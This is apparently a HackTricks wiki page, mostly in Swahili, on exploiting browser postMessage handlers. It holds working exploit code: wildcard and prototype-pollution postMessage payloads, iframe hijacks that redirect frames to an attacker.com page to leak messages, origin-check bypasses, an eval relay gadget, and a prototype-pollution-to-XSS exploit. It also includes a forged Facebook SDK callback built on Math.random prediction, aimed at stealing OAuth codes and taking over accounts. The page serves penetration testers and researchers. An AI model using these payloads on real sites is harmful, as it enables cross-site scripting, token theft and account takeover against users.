# Udhaifu za PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Tuma **PostMessage**

**PostMessage** inatumia function ifuatayo kutuma ujumbe:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Kumbuka kwamba **targetOrigin** inaweza kuwa '\*' au URL kama _https://company.com._\ Katika **senario ya pili**, **ujumbe unaweza kutumwa tu kwa domain hiyo** (hata kama origin ya Window object ni tofauti).\ Ikiwa **wildcard** inatumika, **jumbe zinaweza kutumwa kwa domain yoyote**, na zitatumwa kwa origin ya Window object.

### Kushambulia iframe & wildcard katika **targetOrigin**

Kama ilivyoelezwa katika [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ikiwa utapata ukurasa unaoweza **iframed** (hakuna `X-Frame-Header` protection) na ambao unao **tuma ujumbe nyeti** kupitia **postMessage** ukitumia **wildcard** (\*), unaweza **badilisha** **origin** ya **iframe** na **leak** ujumbe **nyeti** kwa domain inayodhibitiwa na wewe.\ Kumbuka kwamba ikiwa ukurasa unaweza **iframed** lakini **targetOrigin** **imewekwa kwa URL na sio wildcard**, **hila hii haitafanya kazi**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** ni njia inayotumika na JS kutangaza utendaji unaotarajia `postMessages`.\
Msimbo unaofanana na ufuatao utatumika:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note katika kesi hii jinsi **kitu cha kwanza** ambacho code inafanya ni **kukagua origin**. Hii ni sana **muhimu**, hasa ikiwa ukurasa utakuwa ukifanya **lolote nyeti** na taarifa zinazopokelewa (kama kubadilisha password). **Kama haitakagua origin, attackers wanaweza kufanya victims watume data yoyote kwa endpoints hizi** na kubadilisha passwords za victims (katika mfano huu).

### Enumeration

Ili **find event listeners** kwenye ukurasa wa sasa unaweza:

- **Tafuta** JS code kwa `window.addEventListener` na `$(window).on` (_JQuery version_)
- **Endesha** katika developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Nenda kwenye** _Elements --> Event Listeners_ katika developer tools za browser

![](<../../images/image (396).png>)

- Tumia **browser extension** kama [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) au [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Browser extensions hizi zitakamata ujumbe wote na kuonyesha kwako.

### Origin check bypasses

- **`event.isTrusted`** attribute inachukuliwa kuwa salama kwani inarudisha `True` tu kwa events zinazozalishwa na vitendo halisi vya mtumiaji. Ingawa ni changamoto ku-bypass ikiwa imetekelezwa kwa usahihi, umuhimu wake katika ukaguzi wa usalama ni mkubwa.
- Matumizi ya **`indexOf()`** kwa uthibitishaji wa origin katika events za PostMessage yanaweza kupatikana kuwa nyeti kwa bypassing. Mfano unaoonyesha udhaifu huu ni:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Mbinu ya **`search()`** kutoka `String.prototype.search()` inakusudiwa kwa regular expressions, si kwa strings. Kupitisha chochote kingine badala ya regexp husababisha uongozaji wa siri kwenda regex, na kufanya method hii iwe hai salama. Hii ni kwa sababu katika regex, nukta (.) inafanya kazi kama wildcard, kuruhusu bypassing ya uthibitisho kwa domains zilizotengenezwa kwa ustadi. Kwa mfano:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Kazi ya **`match()`**, kama `search()`, inashughulikia regex. Ikiwa regex imeundwa vibaya, inaweza kuwa nyeti kwa bypassing.
- Kazi ya **`escapeHtml`** inalenga kusafisha inputs kwa ku-escape characters. Hata hivyo, haifanyi object mpya iliyosafishwa bali inaandika juu properties za object iliyopo. Tabia hii inaweza kutumika vibaya. Hasa, kama object inaweza kuingiliwa kwa njia ambayo property inayodhibitiwa haikutambui `hasOwnProperty`, `escapeHtml` haitatekeleza kama inavyotarajiwa. Hii inaonyeshwa katika mifano hapa chini:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Katika muktadha wa udhaifu huu, object ya `File` inatambulika kuwa rahisi kutumika kwa sababu ya property yake isomeka-tu `name`. Property hii, inapowekwa katika templates, haisafishwi na `escapeHtml`, ikisababisha hatari za usalama.

- `document.domain` property katika JavaScript inaweza kuwekwa na script ili kufupisha domain, kuruhusu utekelezaji uliorahisishwa wa same-origin policy ndani ya parent domain ile ile.

### Origin-only trust + trusted relays

Ikiwa receiver inacheck tu **`event.origin`** (mfano, inamtrust yoyote `*.trusted.com`) mara nyingi unaweza kupata **ukurasa wa "relay" kwenye origin hiyo ambao unareflect params za attacker kupitia `postMessage`** kwa `targetOrigin`/`targetWindow` uliotolewa. Mifano ni pamoja na gadgets za marketing/analytics zinazochukua query params na kupeleka `{msg_type, access_token, ...}` kwa `opener`/`parent`. Unaweza:

- **Fungua victim page katika popup/iframe yenye `opener`** ili handlers zake ziandikishwe (pixels/SDK nyingi zinaambatisha listeners tu wakati `window.opener` inapatikana).
- **Elekeza window nyingine ya attacker kwa relay endpoint kwenye trusted origin**, ukijaza fields za message unazotaka ziweka (message type, tokens, nonces).
- Kwa kuwa message sasa inakuja **kutoka kwa trusted origin**, origin-only validation inapita na unaweza kusababisha vitendo vya privileged (mabadiliko ya state, API calls, DOM writes) katika listener ya victim.

Mfumo wa matumizi ya udhaifu uliotazamiwa:

- Analytics SDKs (mfano, pixel/fbevents-style) hula messages kama `FACEBOOK_IWL_BOOTSTRAP`, kisha **huita backend APIs kwa kutumia token iliyotolewa katika message** na kujumuisha **`location.href` / `document.referrer`** katika request body. Ikiwa utatoa token yako mwenyewe, unaweza **kusoma requests hizi katika request history/logs ya token** na exfil **OAuth codes/tokens** zilizopo katika URL/referrer ya ukurasa wa victim.
- Relay yoyote inayoreflect fields yoyote ndani ya `postMessage` inakuwezesha **spoof message types** zinazotarajiwa na privileged listeners. Changanya na weak input validation kufikia Graph/REST calls, kufungua vipengele, au flows zinazofanana na CSRF.

Hunting tips: enumerate `postMessage` listeners ambazo zinacheck tu `event.origin`, kisha tazama **same-origin HTML/JS endpoints ambazo zinaforward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Unganisha zote kwa kutumia `window.open()` + `postMessage` ili bypass origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, ni muhimu kuelewa kwamba origin ya iframe itakatwa kuwa `null`. Hii ni muhimu hasa unaposhughulika na **sandbox attributes** na athari zake kwenye usalama na ufanisi.

Kwa kuspecify **`allow-popups`** katika sandbox attribute, popup yoyote inayofunguliwa kutoka ndani ya iframe itarithi vizuizi vya sandbox vya parent. Hii inamaanisha kuwa isipokuwa attribute ya **`allow-popups-to-escape-sandbox`** pia iwepo, origin ya popup hiyo pia itawekwa kuwa `null`, ikilingana na origin ya iframe.

Kwa hivyo, wakati popup inafunguliwa chini ya masharti haya na message ikatumwa kutoka iframe hadi popup kwa kutumia **`postMessage`**, pande zote za kutuma na kupokea zina origins zao zikiwa `null`. Hali hii inasababisha senario ambapo **`e.origin == window.origin`** inatathminiwa kuwa true (`null == null`), kwa sababu iframe na popup zote zinashiriki thamani ile ile ya origin ya `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Inawezekana ku-check kama message ilitoka kwa window ileile script inayosikiliza ndani yake (hii ni muhimu hasa kwa **Content Scripts from browser extensions** kutathmini kama message ilitumwa kutoka ukurasa uleule):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Unaweza kulazimisha **`e.source`** ya ujumbe kuwa null kwa kuunda **iframe** ambayo **inayotuma** **postMessage** na **inafutwa mara moja**.

Kwa maelezo zaidi **soma:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Ili kutekeleza mashambulizi haya ipasavyo utaweza **kuweka ukurasa wa tovuti wa mwathiriwa** ndani ya `iframe`. Lakini baadhi ya headers kama `X-Frame-Header` zinaweza **kuzuia** ile **tabia**.\
Katika senario hizo bado unaweza kutumia shambulio lisilo la kimficho zaidi. Unaweza kufungua tabo mpya kwa ajili ya web application yenye udhaifu na kuwasiliana nayo:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kujirusha ujumbe uliotumwa kwa child kwa kuzuia ukurasa mkuu

Kwenye ukurasa ufuatao unaweza kuona jinsi unavyoweza kuiba **sensitive postmessage data** zilizotumwa kwa **child iframe** kwa **kuzuia** ukurasa **main** kabla ya data kutumwa na kutesa **XSS in the child** ili **leak the data** kabla haipokelewe:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Kujirusha ujumbe kwa kubadilisha location ya iframe

Ikiwa unaweza kuweka iframe ya webpage bila X-Frame-Header ambayo ina iframe nyingine, unaweza **kubadilisha the location ya child iframe hiyo**, hivyo ikiwa inapokea **postmessage** iliyotumwa ikitumia **wildcard**, mshambuliaji anaweza **kubadilisha** iframe hiyo **origin** kwenda ukurasa **controlled** naye na **kuiba** ujumbe:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage kwa Prototype Pollution na/au XSS

Katika matukio ambapo data inayotumwa kupitia `postMessage` inatekelezwa na JS, unaweza kuweka ukurasa katika `iframe` na **exploit** **prototype pollution/XSS** kwa kutuma exploit kupitia `postMessage`.

Makala chache **zilizoelezwa vizuri za XSS kupitia `postMessage`** zinaweza kupatikana katika [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Mfano wa exploit ya kutumia **Prototype Pollution and then XSS** kupitia `postMessage` kwa `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Kwa **maelezo zaidi**:

- Kiungo kwa ukurasa kuhusu [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Kiungo kwa ukurasa kuhusu [**XSS**](../xss-cross-site-scripting/index.html)
- Kiungo kwa ukurasa kuhusu [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Orodha ya kuruhusiwa ya asili iliyothibitishwa si kizuizi

Ukaguzi kali wa `event.origin` hufanya kazi tu ikiwa **asili iliyothibitishwa haiwezi kuendesha JS ya mshambuliaji**. Wakati kurasa zenye vibali zinajaisha iframes za watu wa tatu na kudhani `event.origin === "https://partner.com"` ni salama, XSS yoyote kwenye `partner.com` inageuka kuwa daraja kuelekea kwa mzazi:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Mfano wa mashambulizi ulioshuhudiwa porini:

1. **Exploit XSS katika iframe ya mshirika** na kuacha relay gadget ili kila `postMessage` iwe code exec ndani ya trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, tuma JS kwa iframe iliyovamiwa inayoforward aina ya message iliyoruhusiwa kurudi kwa parent. Ujumbe unatoka `partner.com`, unapita allowlist, na unaabeba HTML unaoingizwa bila usalama:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Parent inapiga HTML ya mshambuliaji, ikitoa **JS execution in the parent origin** (mfano, `facebook.com`), ambayo inaweza kutumika kuiba OAuth codes au kupeleka hadi account takeover kamili.

Key takeaways:

- **Partner origin isn't a boundary**: XSS yoyote katika partner aliyetajwa kama "trusted" inamruhusu mshambuliaji kutuma messages zilizoidhinishwa zinazopita checks za `event.origin`.
- Handlers ambazo **render partner-controlled payloads** (mfano, `innerHTML` on specific message types) hufanya partner compromise kuwa same-origin DOM XSS.
- Uso mkubwa wa **message surface** (aina nyingi, hakuna uhalalishaji wa muundo) unatoa gadgets zaidi za pivoting mara iframe ya partner inapodukuliwa.

### Kutabiri **`Math.random()`** callback tokens in postMessage bridges

When message validation uses a “shared secret” generated with `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) and the same helper also names plugin iframes, you can recover PRNG outputs and forge trusted messages:

- **Leak PRNG outputs via `window.name`:** The SDK auto-names plugin iframes with `guid()`. If you control the top frame, iframe the victim page, then navigate the plugin iframe to your origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) and read `window.frames[0].frames[0].name` to obtain a raw `Math.random()` output.
- **Force more outputs without reloads:** Some SDKs expose a reinit path; in the FB SDK, firing `init:post` with `{xfbml:1}` forces `XFBML.parse()`, destroys/recreates the plugin iframe, and generates new names/callback IDs. Repeated reinit produces as many PRNG outputs as needed (note extra internal `Math.random()` calls for callback/iframe IDs, so solvers must skip intervening values).
- **Trusted-origin delivery via parameter pollution:** If a first-party plugin endpoint reflects an unsanitized parameter into the cross-window payload (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), you can inject `&type=...&iconSVG=...` while preserving the trusted `facebook.com` origin.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` and feed several values (even non-consecutive) into a V8 `Math.random` predictor (e.g., Z3-based). Generate the next `guid()` locally to forge the expected callback token.
- **Trigger the sink:** Craft the postMessage data so the bridge dispatches `xd.mpn.setupIconIframe` and injects HTML in `iconSVG` (e.g., URL-encoded `<img src=x onerror=...>`), achieving DOM XSS inside the hosting origin; from there, same-origin iframes (OAuth dialogs, arbiters, etc.) can be read.
- **Framing quirks help:** The chain requires framing. In some mobile webviews, `X-Frame-Options` may degrade to unsupported `ALLOW-FROM` when `frame-ancestors` is present, and “compat” parameters can force permissive `frame-ancestors`, enabling the `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Marejeo

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Kwa mazoezi: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
